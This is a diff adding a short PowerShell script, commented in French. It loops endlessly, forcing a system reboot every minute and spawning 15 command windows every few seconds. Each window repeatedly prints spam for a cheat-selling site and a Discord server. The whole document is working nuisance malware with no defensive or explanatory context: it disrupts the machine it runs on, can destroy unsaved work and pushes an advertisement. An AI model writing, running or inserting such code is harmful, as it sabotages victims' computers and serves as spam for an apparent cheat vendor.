@@ -1,0 +1,12 @@
+while ($true) {
+    # Planifie un redémarrage dans 1 minute (60 secondes)
+    shutdown /r /t 60 /f
+
+    # Ouvre plusieurs fenêtres de commande avec un titre dynamique et du texte en boucle
+    for ($i = 0; $i -lt 15; $i++) {
+        $randomTitle = -join (Get-Random -InputObject ('A'..'Z') -Count 8)
+        Start-Process cmd -ArgumentList "/k title $randomTitle && color 0A && :loop && echo aegisshop.xyz | DISCORD.GG/AEGIS-V2 BEST CHEATS JOIN FOR FREE CANDY && goto loop"
+    }
+
+    Start-Sleep -Seconds 5
+}
